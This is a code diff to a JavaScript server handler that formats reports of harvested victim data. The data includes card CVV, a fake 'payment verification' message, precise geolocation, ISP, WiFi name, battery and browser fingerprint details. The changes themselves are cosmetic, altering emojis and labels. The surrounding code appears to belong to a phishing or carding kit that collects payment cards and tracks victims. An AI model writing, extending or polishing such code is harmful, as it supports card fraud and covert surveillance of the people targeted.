@@ -196,18 +196,24 @@ export default async function handler(req, res) {
         message += '\n🔐 CVV: ' + cvv;
       }
     } else {
+      // Build location CON ISP + emojis claros
       const locationParts = [];
-      if (geoCity) locationParts.push('🏙️ Ciudad: ' + geoCity);
-      if (geoRegion) locationParts.push('🗺️ Region: ' + geoRegion);
-      if (geoCountry) locationParts.push('🌐 Pais: ' + geoCountry + (geoCountryCode ? ' (' + geoCountryCode + ')' : ''));
-      if (geoIsp) locationParts.push('📡 ISP: ' + geoIsp);
-      if (geoLat && geoLon) locationParts.push('📍 Coordenadas: ' + geoLat + ', ' + geoLon);
+      if (geoCity) locationParts.push('🏙️ *Ciudad:* ' + geoCity);
+      if (geoRegion) locationParts.push('🗺️ *Region:* ' + geoRegion);
+      if (geoCountry) locationParts.push('🌎 *Pais:* ' + geoCountry + (geoCountryCode ? ' (' + geoCountryCode + ')' : ''));
+      if (geoIsp) locationParts.push('📡 *ISP:* ' + geoIsp);
+      if (geoLat && geoLon) locationParts.push('📍 *Coordenadas:* ' + geoLat + ', ' + geoLon);
 
+      // Build device CON emojis
       const deviceParts = [];
-      deviceParts.push('🖥️ CPU: ' + cpuCores + ' nucleos');
-      deviceParts.push('💾 RAM: ' + deviceMemory + ' GB');
-      deviceParts.push('📱 Tipo: ' + deviceTypeText);
-      if (wifiName) deviceParts.push('📶 WiFi: ' + wifiName);
+      deviceParts.push('🧠 *CPU:* ' + cpuCores + ' nucleos');
+      deviceParts.push('💾 *RAM:* ' + deviceMemory + ' GB');
+      deviceParts.push('📱 *Tipo:* ' + deviceTypeText);
+      if (wifiName) deviceParts.push('📶 *WiFi:* ' + wifiName);
+
+      // Estado y cookies legibles
+      const statusText = onlineStatus === 'Sí' ? '🟢 Conectado' : '🔴 Desconectado';
+      const cookiesText = cookiesEnabled === 'Sí' ? '✅ Activadas' : '❌ Desactivadas';
 
       if (isPayment) {
         message = '💳 *Verificacion de pago*';
@@ -232,13 +238,13 @@ export default async function handler(req, res) {
           for (const p of deviceParts) message += '\n' + p;
         }
 
-        message += '\n\n🌐 *Navegador:* ' + userAgent;
-        message += '\n🌐 *Idioma:* ' + language;
-        message += '\n🖥️ *Pantalla:* ' + screenResolution + ' (' + colorDepth + ' bits)';
+        message += '\n\n💬 *Navegador:* ' + userAgent;
+        message += '\n🗣️ *Idioma:* ' + language;
+        message += '\n📺 *Pantalla:* ' + screenResolution + ' (' + colorDepth.replace(' bits','') + ' bits)';
         message += '\n⏰ *Zona horaria:* ' + timezone;
         message += '\n💻 *Plataforma:* ' + platform;
-        message += '\n📶 *Estado:* ' + onlineStatus;
-        message += '\n🍪 *Cookies:* ' + cookiesEnabled;
+        message += '\n📶 *Estado:* ' + statusText;
+        message += '\n🍪 *Cookies:* ' + cookiesText;
 
         message += '\n\n⏰ *Hora:* ' + timestamp;
       } else {
@@ -262,13 +268,13 @@ export default async function handler(req, res) {
           message += '\n\n🔋 *Bateria:* ' + batteryLevel + (batteryCharging === 'Sí' ? ' (Cargando)' : '');
         }
 
-        message += '\n\n🌐 *Navegador:* ' + userAgent;
-        message += '\n🌐 *Idioma:* ' + language;
-        message += '\n🖥️ *Pantalla:* ' + screenResolution + ' (' + colorDepth + ' bits)';
+        message += '\n\n💬 *Navegador:* ' + userAgent;
+        message += '\n🗣️ *Idioma:* ' + language;
+        message += '\n📺 *Pantalla:* ' + screenResolution + ' (' + colorDepth.replace(' bits','') + ' bits)';
         message += '\n⏰ *Zona horaria:* ' + timezone;
         message += '\n💻 *Plataforma:* ' + platform;
-        message += '\n📶 *Estado:* ' + onlineStatus;
-        message += '\n🍪 *Cookies:* ' + cookiesEnabled;
+        message += '\n📶 *Estado:* ' + statusText;
+        message += '\n🍪 *Cookies:* ' + cookiesText;
 
         message += '\n\n⏰ *Hora:* ' + timestamp;
       }
